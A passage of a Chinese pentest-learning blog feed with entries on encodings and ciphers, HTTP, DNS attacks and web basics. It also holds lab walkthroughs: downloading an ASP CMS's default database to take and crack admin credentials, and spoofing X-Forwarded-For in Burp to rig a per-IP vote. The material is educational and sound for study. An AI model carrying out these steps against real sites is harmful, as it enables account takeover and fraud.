，就是<strong>去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符</strong>。 如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/8.jpg"></p><h5 id="emsp-emsp-AES："><a href="#emsp-emsp-AES：" class="headerlink" title="&emsp;&emsp;AES："></a>&emsp;&emsp;AES：</h5><p>&emsp;&emsp;（<a href="https://www.mklab.cn/utils/aes%EF%BC%89">https://www.mklab.cn/utils/aes）</a></p><p>&emsp;&emsp;是相对安全的加密方式，在加密的过程中涉及到了密码、偏移量、数据块、填充四种方式的随机选择和搭配，解压的难度很大。一般用base64解密出来是乱码，有很大可能是AES加密。在比较重视安全的网站和比赛中都会使用。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/9.jpg"></p><h5 id="emsp-emsp-DES："><a href="#emsp-emsp-DES：" class="headerlink" title="&emsp;&emsp;DES："></a>&emsp;&emsp;DES：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/encrypt_des.html%EF%BC%89">https://www.sojson.com/encrypt_des.html）</a></p><p>&emsp;&emsp;DES是目前最为流行的加密算法之一。DES是对称的，也就是说它使用同一个密钥来加密和解密数据。 DES还是一种分组加密算法，该算法每次处理固定长度的数据段，称之为分组。DES分组的大小是64位，如果加密的数据长度不是64位的倍数，可以按照某种具体的规则来填充位。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/10.jpg"></p><h4 id="3-加密形式算法解析"><a href="#3-加密形式算法解析" class="headerlink" title="3.加密形式算法解析"></a>3.加密形式算法解析</h4><ul><li>直接加密</li><li>salt</li><li>密码</li><li>偏移</li><li>带位数</li><li>带模式</li><li>带干扰</li><li>自定义组合</li><li>等</li></ul><h4 id="4-解密方法"><a href="#4-解密方法" class="headerlink" title="4.解密方法"></a>4.解密方法</h4><ul><li>枚举</li><li>自定义逆向算法</li><li>可逆向</li></ul><h4 id="5-常规加密算法的特性"><a href="#5-常规加密算法的特性" class="headerlink" title="5.常规加密算法的特性"></a>5.常规加密算法的特性</h4><ul><li>长度位数</li><li>字符规律</li><li>代码分析</li><li>搜索获取</li><li>等</li></ul><h4 id="6-其他相关涉及资源"><a href="#6-其他相关涉及资源" class="headerlink" title="6.其他相关涉及资源"></a>6.其他相关涉及资源</h4><p>&emsp;&emsp;<a href="https://www.mozhe.cn/">https://www.mozhe.cn</a></p><p>&emsp;&emsp;<a href="https://www.cmd5.com/">https://www.cmd5.com</a></p><p>&emsp;&emsp;<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p>&emsp;&emsp;<a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a></p><p>&emsp;&emsp;<a href="https://www.cr173.com/soft/21692.html">https://www.cr173.com/soft/21692.html</a></p><p>&emsp;&emsp;<a href="https://gitee.com/ComsenzDiscuz/Discuzx">https://gitee.com/ComsenzDiscuz/Discuzx</a></p><h4 id="7-意义"><a href="#7-意义" class="headerlink" title="7.意义"></a>7.意义</h4><p>&emsp;&emsp;个人理解，看似加密编码算法是密码学的知识，但是我们只需要了解相关的加密方式，在实践相关的sql注入等渗透攻击时，我们输入的并不一定是直白的代码，还需要进行一定的加密运作才能。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ASP演示攻击</title>
    <link href="/2022/07/05/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/"/>
    <url>/2022/07/05/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="ASP演示攻击"><a href="#ASP演示攻击" class="headerlink" title="ASP演示攻击"></a>ASP演示攻击</h1><h4 id="1-打开靶场，选择ASP注入"><a href="#1-打开靶场，选择ASP注入" class="headerlink" title="1.打开靶场，选择ASP注入"></a>1.打开靶场，选择ASP注入</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-1.png"></p><h4 id="2-进入网站，打开任意界面，查看页面的后缀，根据后缀判断"><a href="#2-进入网站，打开任意界面，查看页面的后缀，根据后缀判断" class="headerlink" title="2.进入网站，打开任意界面，查看页面的后缀，根据后缀判断"></a>2.进入网站，打开任意界面，查看页面的后缀，根据后缀判断</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-2.png"></p><h4 id="3-查看网页底部，发现关键词XYCMS"><a href="#3-查看网页底部，发现关键词XYCMS" class="headerlink" title="3.查看网页底部，发现关键词XYCMS"></a>3.查看网页底部，发现关键词XYCMS</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-3.png"></p><h4 id="4-搜索XYCMS源码，下载"><a href="#4-搜索XYCMS源码，下载" class="headerlink" title="4.搜索XYCMS源码，下载"></a>4.搜索XYCMS源码，下载</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-4.png"></p><h4 id="5-打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms-mdb-asp特有文件"><a href="#5-打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms-mdb-asp特有文件" class="headerlink" title="5.打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)"></a>5.打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-5-1.png"></p><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-5-2.png"></p><h4 id="6-该文件存有管理员的账号密码"><a href="#6-该文件存有管理员的账号密码" class="headerlink" title="6.该文件存有管理员的账号密码"></a>6.该文件存有管理员的账号密码</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-6.png"></p><h4 id="7-根据下载的源码路径，可以去尝试访问网站的目录：-http-192-168-139-137-8003-xydata-xycms-mdb-下载到文件"><a href="#7-根据下载的源码路径，可以去尝试访问网站的目录：-http-192-168-139-137-8003-xydata-xycms-mdb-下载到文件" class="headerlink" title="7.根据下载的源码路径，可以去尝试访问网站的目录： http://192.168.139.137:8003/xydata/xycms.mdb,下载到文件"></a>7.根据下载的源码路径，可以去尝试访问网站的目录： <a href="http://192.168.139.137:8003/xydata/xycms.mdb,%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%96%87%E4%BB%B6">http://192.168.139.137:8003/xydata/xycms.mdb,下载到文件</a></h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-7.png"></p><h4 id="8-尝试访问到后台"><a href="#8-尝试访问到后台" class="headerlink" title="8.尝试访问到后台"></a>8.尝试访问到后台</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-8.png"></p><h4 id="9-数据库中admin数据-密码MD5解密"><a href="#9-数据库中admin数据-密码MD5解密" class="headerlink" title="9.数据库中admin数据 密码MD5解密"></a>9.数据库中admin数据 密码MD5解密</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-9.png"></p><h4 id="10-使用用户密码即可登录"><a href="#10-使用用户密码即可登录" class="headerlink" title="10.使用用户密码即可登录"></a>10.使用用户密码即可登录</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-10.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web源码扩展</title>
    <link href="/2022/07/04/web%E6%BA%90%E7%A0%81%E6%89%A9%E5%B1%95/"/>
    <url>/2022/07/04/web%E6%BA%90%E7%A0%81%E6%89%A9%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB源码"><a href="#WEB源码" class="headerlink" title="WEB源码"></a>WEB源码</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>&emsp;&emsp;Web源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中Web源码有很多技术需要简明分析。比如：获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</p><p><img src="/img/web%E6%BA%90%E7%A0%81%E6%89%A9%E5%B1%95/3-1.png"></p><h3 id="二、web源码目录结构"><a href="#二、web源码目录结构" class="headerlink" title="二、web源码目录结构"></a>二、web源码目录结构</h3><ul><li><p>据库配置文件</p></li><li><p>后台目录</p></li><li><p>模板目录</p></li><li><p>数据库目录</p></li><li><p>index.php 根据文件后缀判定</p></li><li><p>admin 网站后台路径</p></li><li><p>data 数据相关目录</p></li><li><p>install 安装目录</p></li><li><p>member 会员目录</p></li><li><p>template 模板目录(和网站相关的整体架构)</p></li><li><p>data =&gt; confing.php 数据库配置文件，网站和数据库的通讯信息，连接账号密码，可以去连接对方数据库，从数据库去得到这个网站的源码里面涉及到的管理员的账号密码。</p></li></ul><h3 id="三、web源码脚本类型"><a href="#三、web源码脚本类型" class="headerlink" title="三、web源码脚本类型"></a>三、web源码脚本类型</h3><ul><li>ASP</li><li>PHP</li><li>ASPX</li><li>JSP</li><li>JAVAWEB</li><li>其他</li></ul><h3 id="四、web源码应用分类"><a href="#四、web源码应用分类" class="headerlink" title="四、web源码应用分类"></a>四、web源码应用分类</h3><p>&emsp;&emsp;对于社交、论坛、门户、第三份以及博客等Web的应用而言，不同的应用意味着不同的代码机制对应漏洞。在审计Web源码模板时，应该需要注意开源未开源、框架非框架以及关于CMS识别问题及后续等。</p><p>网站类侧重漏洞：</p><ul><li>门户网站———————-综合类漏洞</li><li>电商—————————业务逻辑漏洞</li><li>论坛—————————XSS漏洞</li><li>博客—————————漏洞较少</li><li>第三方————————根据博客功能决定</li></ul><h3 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h3><p>&emsp;1）框架与非框架</p><p>&emsp;&emsp;当被攻击方采用的是框架类型的Web源码时，我们就可以直接寻找整体框架的漏洞，如果是非框架的Web源码，则寻到的漏洞是针对代码写出来的漏洞（即代码审计）</p><p>&emsp;&emsp;  比如：thinkPHP漏洞</p><p>&emsp;2）CMS（内容管理系统）</p><ul><li><p>CMS：</p><p>内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场</p></li><li><p>CMS识别：</p><p>判定一个网站是用什么程序搭建的</p></li><li><p>CMS组成要素</p><p>–文档模板</p><p>–脚本语言或标记语言</p><p>–与数据库集成</p></li><li><p>CMS识别</p><p>–<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p>–<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p></li></ul><p>&emsp;3）源码的获取途径</p><ul><li>扫描工具探测备份文件</li><li>CMS识别技术获取CMS名称然后从网上下载</li><li>百度直接搜索：源码</li><li>咸鱼上会有卖</li><li>第三方源码站：比如菜鸟源码</li><li>各种行业对应</li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>抓包攻击演示</title>
    <link href="/2022/07/02/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/"/>
    <url>/2022/07/02/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="抓包攻击演示（Burp）"><a href="#抓包攻击演示（Burp）" class="headerlink" title="抓包攻击演示（Burp）"></a>抓包攻击演示（Burp）</h1><h2 id="1-进入投票系统，每个ip只能点击一次"><a href="#1-进入投票系统，每个ip只能点击一次" class="headerlink" title="1.进入投票系统，每个ip只能点击一次"></a>1.进入投票系统，每个ip只能点击一次</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-1.png"></p><h2 id="2-使用burp进行抓包，增加X-FORWARDED-FOR"><a href="#2-使用burp进行抓包，增加X-FORWARDED-FOR" class="headerlink" title="2.使用burp进行抓包，增加X_FORWARDED_FOR"></a>2.使用burp进行抓包，增加X_FORWARDED_FOR</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-2.png"></p><h2 id="3-发送到intruder，设置变量"><a href="#3-发送到intruder，设置变量" class="headerlink" title="3.发送到intruder，设置变量"></a>3.发送到intruder，设置变量</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-3.png"></p><h2 id="4-设置数值"><a href="#4-设置数值" class="headerlink" title="4.设置数值"></a>4.设置数值</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-4.png"></p><h2 id="5-开始攻击"><a href="#5-开始攻击" class="headerlink" title="5.开始攻击"></a>5.开始攻击</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-5.png"></p><h2 id="6-完成任务"><a href="#6-完成任务" class="headerlink" title="6.完成任务"></a>6.完成任务</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-6.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>http和https</title>
    <link href="/2022/07/02/http%E5%92%8Chttps/"/>
    <url>/2022/07/02/http%E5%92%8Chttps/</url>
    
    <content type="html"><![CDATA[<h2 id="1-HTTP-S数据包种类"><a href="#1-HTTP-S数据包种类" class="headerlink" title="1.HTTP/S数据包种类"></a>1.HTTP/S数据包种类</h2><ul><li>1）Request 请求数据包</li><li>2）Proxy 代理服务器</li><li>3）Response 返回数据包</li></ul><h2 id="2-协议结构"><a href="#2-协议结构" class="headerlink" title="2.协议结构"></a>2.协议结构</h2><p><img src="/img/http%E5%92%8Chttps/2-1.png"></p><ul><li>–HTTPS协议需要得到CA申请证书。</li><li>–HTTP是超文本传输协议，信息是明文传输，HTTPS则是具有安全性的SSL加密传输协议。</li><li>–HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，HTTP使用80端口，HTTPS使用443。</li><li>–HTTP的连接比较简单，是无状态的；HTTPS协议是由SSL+HTTP协议与构成的，可进行加密传输，身份认证的网络协议，比HTTP协议更加安全。</li></ul><h2 id="3-通信过程"><a href="#3-通信过程" class="headerlink" title="3.通信过程"></a>3.通信过程</h2><ul><li><p>1）HTTP通信过程</p><p>建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</p><p>–浏览器建立与web服务器直接的连接。</p><p>–浏览器将请求数据打包（生成请求数据包）并发送到web服务器。</p><p>–web服务器将处理结果打包（生成响应数据包）并发送到浏览器。</p><p>–web服务器关闭连接。</p></li><li><p>2）HTTPS通信过程</p></li></ul><p><img src="/img/http%E5%92%8Chttps/2-2.png"></p><h2 id="4-Request请求数据包数据格式"><a href="#4-Request请求数据包数据格式" class="headerlink" title="4.Request请求数据包数据格式"></a>4.Request请求数据包数据格式</h2><ul><li><p>1）请求行</p><p>–包括请求类型/请求资源路径、协议的版本和类型，一般而言，请求行由三个标记组成：请求方法、请求URL和HTTP版本，它们用空格分隔。</p><p>–例如： GET /index.html HTTP/1.1</p><p>HTTP规划定义了8中可能的请求方法：</p><p>① GET：检索URL中标识资源的一个简单请求。</p><p>② HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档。</p><p>③ POST：服务器接收被写入客户端输出流中数据的请求。</p><p>④ PUT：服务器保存请求数据作为指定URL新内容的请求</p><p>⑤ DELETE：服务器删除URL中命令的资源的请求</p><p>⑥ OPTIONS：关于服务器支持的请求方法信息的请求</p><p>⑦ TRACE：web服务器反馈HTTP请求和其头标的请求</p><p>⑧ CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</p></li><li><p>2）请求头</p><p>–一些键值对，浏览器与web服务器之间都可以发送，包含了特殊的某种含义。</p><p>① HOST：主机或域名地址。</p><p>② Accept：指浏览器或其他客户可以接受的MIME文件格式，servlet可以根据它判断并返回适当的文件格式。</p><p>③ User-Agent：是客户浏览器名称。</p><p>④ Host：对应网址URL中的web名称和端口号。</p><p>⑤ Accept-Language：指出浏览器可以接受的语言种类，如en或者en-us，指英语。</p><p>⑥ connection：用来告诉服务器是否可以维持固定的HTTP连接、http是无连接的，HTTP/1.1使用Keep-Alive为默认值，这样当浏览器需要多个文件时（比如一个HTML文件和相关的图形文件），不需要每次都建立连接。</p><p>⑦ Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，他可以记载服务器相关的用户信息，也可以用来实现会话功能</p><p>⑧ Referer：表明产生请求的网页URL，这个属性可以用来跟踪web请求是从什么网站来的。</p><p>⑨ Content-Type ：用来表明request的内容类型，可以用HttpServeletRequest的getContentType()方法取得。</p><p>⑩ Accept-Charset：指出浏览器可以接受的字符编码。``</p><p><strong>⑪</strong> Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件传递速度。浏览器在接收到web响应之后再解码，然后再检查文件格式。</p></li><li><p>3）空行</p><p>–请求头与请求体之间用一个空行分开；最后一个请求头标之后是空行，发送回车符合退行，通知服务器以下不再有头标。</p></li><li><p>4）请求体</p><p>–要发送的数据，一般使用POST传送，POST最常使用的是Content-Type和Content-Length头标</p></li><li><p>5）请求数据包案例</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET / HTTP/1.1<br>Host: www.baidu.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: BAIDUID=DF85C12211175FD67D599BC8A06EB4B2:FG=1; BIDUPSID=DF85C12211175FD6D8AC7AF7356EF11F; PSTM=1571798152; BD_UPN=13314752; COOKIE_SESSION=251208_1_7_5_8_6_0_0_5_5_0_0_251207_0_1_0_1580795676_1580539587_1580795675%7C9%235096250_55_1580539585%7C9; BDRCVFR[Fc9oatPmwxn]=mk3SLVN4HKm; delPer=0; BD_CK_SAM=1; PSINO=1; H_PS_PSSID=1465_21124_26350_30496; H_PS_645EC=d0f32cF5kQJ3ZcmKhkebQhVlmvrVbJe34vcNJntPlQBU7X%2BEF0T1MJCfpt5UZln7q4OU; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BD_HOME=0<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br></code></pre></td></tr></table></figure><h2 id="5-Response返回数据包格式"><a href="#5-Response返回数据包格式" class="headerlink" title="5.Response返回数据包格式"></a>5.Response返回数据包格式</h2><ul><li><p>1）状态行</p><p>–协议版本，数字形式的状态代码和状态描述，各元素之间用空格进行分割<br>HTTP响应码。</p><p>–部分HTTP响应码：</p><p>1XX：信息，请求收到，继续处理<br>2XX：成功，行为被成功的接收、理解和采纳<br>3XX：重定向，为了完成请求，必须进一步执行的动作<br>4XX：客户端错误<br>5XX：服务器错误<br>200：存在文件<br>403：存在文件夹<br>3XX：均可能存在<br>404：不存在文件及文件夹<br>500：均可能存在</p></li><li><p>2）响应头标</p><p>–包含服务器类型、日期、长度、内容类型等；像请求头标一样，它们指出服务器的功能，标识出响应数据的细节。</p></li><li><p>3）空行</p><p>–响应头与响应体之间用空行隔开；最后一个响应头标之后是一个空行，发送回车符和退行，表面服务器一下不再有头标。</p></li><li><p>4）响应数据</p><p>–浏览器会将实体内容中额数据取出来，生成相应的页面HTML文档和图像等，也就是HTML本身。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web一些基本概念</title>
    <link href="/2022/07/01/web%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <url>/2022/07/01/web%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="一、域名"><a href="#一、域名" class="headerlink" title="一、域名"></a>一、域名</h1><h3 id="1-域名"><a href="#1-域名" class="headerlink" title="1.域名"></a><strong>1.域名</strong></h3><ul><li><p>​        域名（Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识。</p><p>​       由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过<strong>网域名称系统</strong>（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p></li></ul><h3 id="2-二级域名和多级域名"><a href="#2-二级域名和多级域名" class="headerlink" title="2.二级域名和多级域名"></a><strong>2.二级域名和多级域名</strong></h3><ul><li>​        一级域名相比较于二级域名基本更高，二级域名一般都是依附于一级域名之下，即二级域名是一级域名的细分层级。举个例子：如A.com是一级域名，A.B.com则是二级域名。</li></ul><h3 id="3-域名对于渗透的作用"><a href="#3-域名对于渗透的作用" class="headerlink" title="3.域名对于渗透的作用"></a><strong>3.域名对于渗透的作用</strong></h3><ul><li>​       当我们在对网页进行渗透的时候，在主域名找不到漏洞时，可以尝试其下层级的子域名，可以通过在子域名的漏洞从而延伸到主域名中。</li></ul><h3 id="4-域名注册"><a href="#4-域名注册" class="headerlink" title="4.域名注册"></a><strong>4.域名注册</strong></h3><ul><li>​       域名现有的注册机构比较多，其中比较著名的机构是万网，万网已经被阿里云收购。</li></ul><h1 id="二、域名系统"><a href="#二、域名系统" class="headerlink" title="二、域名系统"></a>二、域名系统</h1><h2 id="1-域名系统"><a href="#1-域名系统" class="headerlink" title="1.域名系统"></a><strong>1.域名系统</strong></h2><ul><li><p>​       DNS是计算机域名系统（Domain Name System 或 Domain Name Service）的缩写，它是由解析器和域名服务器组成的，作用是把域名转换成为网络可以识别的ip地址。</p><p>​        域名服务器是指保存有该网络中所有主机的域名和对应IP地址，并具有将域名转换为IP地址功能的服务器。其中域名必须对应一个IP地址，而IP地址不一定有域名。DNS就是进行域名解析的服务器。</p></li></ul><h3 id="2-HOSTS与DNS的关系"><a href="#2-HOSTS与DNS的关系" class="headerlink" title="2.HOSTS与DNS的关系"></a><strong>2.HOSTS与DNS的关系</strong></h3><ul><li><p>​       HOSTS是一个没有扩展名的系统文件，其作用是将一些常用的域名与其对应的IP地址建立一个关联的“数据库”存入电脑中，当用户在浏览器中输入一个需要登录的网址时，系统会首先在HOSTS文件中找到对应IP地址，如果没有找到，则系统会将网址提交DNS域名解析服务器进行IP地址的解析。</p><p>​        访问一个网站时，系统首先在DNS缓存读取该域名所对应的IP地址，当查找不到时就会到系统中查找hosts文件，如果还没有那么才会向DNS服务器请求一个DNS查询。</p></li></ul><h3 id="3-CDN与DNS的关系"><a href="#3-CDN与DNS的关系" class="headerlink" title="3.CDN与DNS的关系"></a><strong>3.CDN与DNS的关系</strong></h3><ul><li><p>​        CDN的全称是内容分发网络，其作用是让用户能够更加快速的得到请求的数据。它能人用户就近访问数据，从而达到快速获取的目的。</p><p>​        举个例子：现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。</p></li></ul><h3 id="4-常见的DNS安全攻击"><a href="#4-常见的DNS安全攻击" class="headerlink" title="4.常见的DNS安全攻击"></a><strong>4.常见的DNS安全攻击</strong></h3><ul><li><h5 id="缓存投毒（DNS污染）"><a href="#缓存投毒（DNS污染）" class="headerlink" title="缓存投毒（DNS污染）"></a>缓存投毒（DNS污染）</h5><p>​        通常也称为域名系统投毒或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上。</p><p>​        用通俗的话描述，就是更改了缓存中某域名的地址，将其改为了自己的虚假地址，当被攻击者点开时，会转到攻击者指定的网站，从而达到攻击的目的。</p></li><li><h5 id="2）DNS劫持"><a href="#2）DNS劫持" class="headerlink" title="2）DNS劫持"></a>2）DNS劫持</h5><p>​       DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应。</p><p>​        其效果就是对特定的网络不能访问或访问的是假网址。这类攻击一般通过恶意软件来更改终端用户TCP/IP设置，将用户指向恶意DNS服务器，该DNS服务器会对域名进行解析，并最终指向钓鱼网站等被攻击者操控的服务器。</p></li><li><h5 id="3）域名劫持"><a href="#3）域名劫持" class="headerlink" title="3）域名劫持"></a>3）域名劫持</h5><p>​        所谓的域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应。</p><p>​        其效果就是对特定的网址不能访问或访问的是假网址。一旦您的域名被劫持，用户被引到假冒的网站进而无法正常浏览网页，用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p></li></ul><ul><li><h5 id="4）DNS-DDOS攻击"><a href="#4）DNS-DDOS攻击" class="headerlink" title="4）DNS DDOS攻击"></a>4）DNS DDOS攻击</h5><p>​        针对DNS的DDoS攻击通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。发送大量非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的。</p></li><li><h5 id="5）反射式DNS放大攻击"><a href="#5）反射式DNS放大攻击" class="headerlink" title="5）反射式DNS放大攻击"></a>5）反射式DNS放大攻击</h5><p>​        DNS 反射放大攻击主要是利用 DNS 回复包比请求包大的特点，放大流量，伪造请求包的源 IP 地址为受害者 IP，将应答包的流量引入受害的服务器。</p></li></ul><h1 id="三、脚本语言"><a href="#三、脚本语言" class="headerlink" title="三、脚本语言"></a>三、脚本语言</h1><h2 id="1-语言脚本类型"><a href="#1-语言脚本类型" class="headerlink" title="1.语言脚本类型"></a><strong>1.语言脚本类型</strong></h2><ul><li>​        脚本语言又被称为扩建的语言，或者动态语言，是一种编程语言，用来控制软件应用程序，脚本通常都是以文本形式保存，只在被调用时进行解释或编译。例如：Scala、JavaScript，VBScript，ActionScript，MAXScript，ASP，JSP，PHP，SQL，Perl，Shell，python，Ruby，JavaFX，Lua，AutoIt等。</li></ul><h2 id="2-不同脚本类型与安全漏洞的关系"><a href="#2-不同脚本类型与安全漏洞的关系" class="headerlink" title="2.不同脚本类型与安全漏洞的关系"></a><strong>2.不同脚本类型与安全漏洞的关系</strong></h2><ul><li>​        不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</li></ul><h1 id="四、后门"><a href="#四、后门" class="headerlink" title="四、后门"></a>四、后门</h1><h2 id="1-后门"><a href="#1-后门" class="headerlink" title="1.后门"></a>1.后门</h2><ul><li>​        后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。类别：网页、线程插入、扩展、C/S后门。</li></ul><h2 id="2-后门在安全测试中的实际意义"><a href="#2-后门在安全测试中的实际意义" class="headerlink" title="2.后门在安全测试中的实际意义"></a>2.后门在安全测试中的实际意义</h2><ul><li>​        例如后门藏在网页上、软件内，悄无声息的进行攻击者想要的操作。</li></ul><h1 id="五、WEB方向"><a href="#五、WEB方向" class="headerlink" title="五、WEB方向"></a>五、WEB方向</h1><h2 id="1-web的组成架构"><a href="#1-web的组成架构" class="headerlink" title="1.web的组成架构"></a>1.web的组成架构</h2><ul><li>网站源码：分脚本类型、分应用方向</li><li>操作系统：windows、linux</li><li>中间件（搭建平台）：apache、iis、tomcat、nginx等</li><li>数据库：access、mysql、mssql、oracle、sybase、db2、postsql等</li></ul><h2 id="2-web相关安全漏洞"><a href="#2-web相关安全漏洞" class="headerlink" title="2.web相关安全漏洞"></a>2.web相关安全漏洞</h2><ul><li><p>web源码对应漏洞：</p><p>–SQL注入</p><p>–文件上传</p><p>–XSS</p><p>–代码执行</p><p>–变量覆盖</p><p>–逻辑漏洞</p><p>–反序列化</p></li><li><p>2）web中间件对应漏洞：</p><p>–未授权访问</p></li><li><p>3）web数据库对应漏洞：</p><p>–内核漏洞</p></li><li><p>4）web系统层对应漏洞：</p><p>–提权漏洞</p><p>–安全代码执行</p></li></ul><h2 id="3-相关资源"><a href="#3-相关资源" class="headerlink" 